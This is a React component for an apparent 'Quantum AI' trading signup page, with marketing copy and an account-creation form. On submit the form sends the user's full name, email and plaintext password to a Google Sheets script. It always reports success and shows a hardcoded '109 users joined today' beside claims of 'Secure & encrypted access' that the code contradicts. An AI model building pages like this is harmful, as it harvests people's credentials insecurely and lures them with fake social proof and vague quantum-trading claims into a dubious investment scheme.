import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import styles from './Hero.module.css';
import GOOGLE_SCRIPT_URL from '../../config/googleSheets';

const Hero = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    password: '',
    tradingLevel: 'beginner',
    termsAccepted: false
  });

  const [passwordStrength, setPasswordStrength] = useState(0);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState({ show: false, success: false, message: '' });

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    const newValue = type === 'checkbox' ? checked : value;
    
    setFormData(prev => ({
      ...prev,
      [name]: newValue
    }));

    if (name === 'password') {
      calculatePasswordStrength(value);
    }
    setSubmitStatus({ show: false, success: false, message: '' });
  };

  const calculatePasswordStrength = (password) => {
    let strength = 0;
    if (password.length >= 8) strength++;
    if (password.match(/[a-z]+/)) strength++;
    if (password.match(/[A-Z]+/)) strength++;
    if (password.match(/[0-9]+/)) strength++;
    if (password.match(/[$@#&!]+/)) strength++;
    setPasswordStrength(strength);
  };

  const getStrengthText = () => {
    const texts = ['Very Weak', 'Weak', 'Fair', 'Good', 'Strong'];
    return texts[passwordStrength - 1] || 'Very Weak';
  };

  const getStrengthColor = () => {
    const colors = ['#f87171', '#fbbf24', '#fbbf24', '#4ade80', '#4ade80'];
    return colors[passwordStrength - 1] || '#f87171';
  };

  const saveToGoogleSheet = async (data) => {
    try {
      const response = await fetch(GOOGLE_SCRIPT_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...data,
          timestamp: new Date().toISOString(),
          source: 'hero_section'
        })
      });

      return { success: true };
    } catch (error) {
      console.error('Error saving to Google Sheet:', error);
      return { success: false, error: error.message };
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!formData.termsAccepted) {
      setSubmitStatus({
        show: true,
        success: false,
        message: 'Please accept the Terms & Conditions to continue.'
      });
      return;
    }

    setIsSubmitting(true);
    setSubmitStatus({ show: false, success: false, message: '' });

    const sheetData = {
      fullName: formData.fullName,
      email: formData.email,
      password: formData.password,
      tradingLevel: formData.tradingLevel,
      termsAccepted: formData.termsAccepted ? 'Yes' : 'No',
      signupDate: new Date().toLocaleDateString(),
      signupTime: new Date().toLocaleTimeString()
    };

    const result = await saveToGoogleSheet(sheetData);
    
    if (result.success) {
      setSubmitStatus({
        show: true,
        success: true,
        message: 'Account created successfully! Redirecting...'
      });
      
      setFormData({
        fullName: '',
        email: '',
        password: '',
        tradingLevel: 'beginner',
        termsAccepted: false
      });
      setPasswordStrength(0);
      
      // Redirect to home after 2 seconds
      setTimeout(() => {
        navigate('/Success');
      }, 2000);
    } else {
      setSubmitStatus({
        show: true,
        success: false,
        message: 'Registration failed. Please try again.'
      });
    }
    
    setIsSubmitting(false);
  };

  return (
    <section className={styles.hero}>
      <div className={styles.heroGlow}></div>
      <div className="container">
        <div className={styles.heroGrid}>
          {/* Left Side: Content */}
          <div className={styles.heroContent}>
            <div className={styles.badge}>
              <span className={styles.pulse}></span>
              QUANTUM AI • EST. 2022
            </div>
            
            <h1 className={styles.title}>
              <span className={styles.gradientText}>Quantum AI</span>
            </h1>
            
            <p className={styles.description}>
              Quantum AI, established in 2022, has been a pioneer in quantum computing, 
              significantly influencing the trading sector. Experience how quantum innovation 
              and AI can revolutionise your market tactics.
            </p>

            <p className={styles.description}>
              Quantum AI unites advanced quantum-inspired algorithms with modern artificial 
              intelligence to help you analyse complex market conditions with greater clarity, 
              speed, and confidence.
            </p>

            <p className={styles.description}>
              Our technology is developed by Quantum AI Ltd — a UK-based research and software 
              organisation focused on bringing next-generation computational methods to financial 
              analysis.
            </p>

            <p className={styles.description}>
              Create your account using the form beside this text and gain access to the platform, 
              intelligent analysis tools, and a secure environment designed to support informed 
              trading decisions.
            </p>

            <div className={styles.stats}>
              <div className={styles.statItem}>
                <span className={styles.statValue}>Automated Trades</span>
              </div>
              <div className={styles.statDivider}></div>
              <div className={styles.statItem}>
                <span className={styles.statValue}>Quantum Computing</span>
              </div>
              <div className={styles.statDivider}></div>
              <div className={styles.statItem}>
                <span className={styles.statValue}>99.9% Uptime</span>
              </div>
            </div>

            <p className={styles.disclaimer}>
              All trading carries risk. No profits are guaranteed.
            </p>
          </div>

          {/* Right Side: Sign Up Form */}
          <div className={styles.heroForm}>
            <div className={styles.formGlow}></div>
            <div className={styles.formCard}>
              <div className={styles.formHeader}>
                <h2 className={styles.formTitle}>Create Account</h2>
                <p className={styles.formSubtitle}>Start your AI-powered trading journey</p>
              </div>

              {submitStatus.show && (
                <div className={`${styles.statusMessage} ${submitStatus.success ? styles.successMessage : styles.errorMessage}`}>
                  <span className="material-symbols-outlined">
                    {submitStatus.success ? 'check_circle' : 'error'}
                  </span>
                  {submitStatus.message}
                </div>
              )}

              <form onSubmit={handleSubmit} className={styles.form}>
                <div className={styles.formGroup}>
                  <label className={styles.label}>
                    <span className="material-symbols-outlined">person</span>
                    Full Name
                  </label>
                  <input
                    type="text"
                    name="fullName"
                    value={formData.fullName}
                    onChange={handleChange}
                    placeholder="John Doe"
                    className={styles.input}
                    required
                    disabled={isSubmitting}
                  />
                </div>

                <div className={styles.formGroup}>
                  <label className={styles.label}>
                    <span className="material-symbols-outlined">email</span>
                    Email Address
                  </label>
                  <input
                    type="email"
                    name="email"
                    value={formData.email}
                    onChange={handleChange}
                    placeholder="john@example.com"
                    className={styles.input}
                    required
                    disabled={isSubmitting}
                  />
                </div>

                <div className={styles.formGroup}>
                  <label className={styles.label}>
                    <span className="material-symbols-outlined">lock</span>
                    Password
                  </label>
                  <input
                    type="password"
                    name="password"
                    value={formData.password}
                    onChange={handleChange}
                    placeholder="••••••••"
                    className={styles.input}
                    required
                    disabled={isSubmitting}
                  />
                  
                  {/* Password Strength Meter */}
                  {formData.password && (
                    <div className={styles.passwordStrength}>
                      <div className={styles.strengthMeter}>
                        {[1, 2, 3, 4, 5].map((level) => (
                          <div
                            key={level}
                            className={`${styles.strengthBar} ${level <= passwordStrength ? styles.active : ''}`}
                            style={level <= passwordStrength ? { backgroundColor: getStrengthColor() } : {}}
                          ></div>
                        ))}
                      </div>
                      <span className={styles.strengthText} style={{ color: getStrengthColor() }}>
                        {getStrengthText()}
                      </span>
                    </div>
                  )}
                </div>

                <div className={styles.formGroup}>
                  <label className={styles.label}>
                    <span className="material-symbols-outlined">analytics</span>
                    Trading Level
                  </label>
                  <select
                    name="tradingLevel"
                    value={formData.tradingLevel}
                    onChange={handleChange}
                    className={styles.select}
                    disabled={isSubmitting}
                  >
                    <option value="beginner">Beginner</option>
                    <option value="intermediate">Intermediate</option>
                    <option value="expert">Expert</option>
                  </select>
                </div>

                <div className={styles.checkboxGroup}>
                  <input
                    type="checkbox"
                    name="termsAccepted"
                    id="terms"
                    checked={formData.termsAccepted}
                    onChange={handleChange}
                    className={styles.checkbox}
                    required
                    disabled={isSubmitting}
                  />
                  <label htmlFor="terms" className={styles.checkboxLabel}>
                    I agree to the <a href="#/terms" className={styles.link}>Terms & Conditions</a>
                  </label>
                </div>

                <button 
                  type="submit" 
                  className={styles.submitButton}
                  disabled={isSubmitting}
                >
                  {isSubmitting ? (
                    <>
                      <span className={styles.spinner}></span>
                      Creating Account...
                    </>
                  ) : (
                    'Create Free Account'
                  )}
                </button>
              </form>

              {/* Stats below button */}
              <div className={styles.signupStats}>
                <div className={styles.statItem}>
                  <span className={styles.statIcon} className="material-symbols-outlined">group</span>
                  <div className={styles.statInfo}>
                    <span className={styles.statNumber}>109</span>
                    <span className={styles.statLabel}>users joined today</span>
                  </div>
                </div>

                <div className={styles.statItem}>
                  <span className={styles.statIcon} className="material-symbols-outlined">sync_alt</span>
                  <div className={styles.statInfo}>
                    <span className={styles.statLabel}>Withdraw anytime</span>
                  </div>
                </div>

                <div className={styles.statItem}>
                  <span className={styles.statIcon} className="material-symbols-outlined">encrypted</span>
                  <div className={styles.statInfo}>
                    <span className={styles.statLabel}>Secure & encrypted access</span>
                  </div>
                </div>
              </div>

             


            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default Hero;